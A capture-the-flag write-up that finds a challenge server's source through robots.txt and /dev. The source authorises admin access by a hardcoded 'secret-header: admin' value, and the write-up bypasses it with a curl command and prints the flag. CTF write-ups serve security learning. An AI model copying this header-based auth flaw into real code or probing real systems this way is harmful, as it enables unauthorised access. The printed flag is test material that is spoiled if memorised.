---
ai_date: '2025-04-27 05:11:51'
ai_summary: Found secret header exploitation for admin access to view source code
ai_tags:
- http-hdr
- xss
- secret
created: 2024-06-11T01:33
updated: 2024-06-11T01:34
---

> APOCALYPSE members frequent this server but we dont know what for. Help us find out what its for.
> The URL for this challenge: http://chals.cyberthon22f.ctf.sg:40301/

`http://chals.cyberthon22f.ctf.sg:40301/robots.txt`

```
User-agent: *
Disallow:dev
```

`http://chals.cyberthon22f.ctf.sg:40301/dev` gives us the source code

```js
const path              = require('path');
const express           = require('express');
const router            = express.Router();

router.get('/', (req, res) => {
	secret = req.headers["secret-header"];
    if (secret == "admin"){
    	return res.sendFile(path.resolve('views/admin.html'));
    }
    return res.sendFile(path.resolve('views/index.html'));
});

router.get('/robots.txt', (req, res) => {
    res.type('text/plain');
    res.send("User-agent: *\nDisallow:dev");
});

router.get('/dev', (req, res) => {
	return res.sendFile(path.resolve('dev/source.zip'));
})

module.exports = router;
```

```bash
curl "http://chals.cyberthon22f.ctf.sg:40301/" \
     -H 'secret-header: admin'
```

And we get our flag

```flag
Cyberthon{l0w_ceiling_w4tch_ur_head_a6243746643baf3d}
```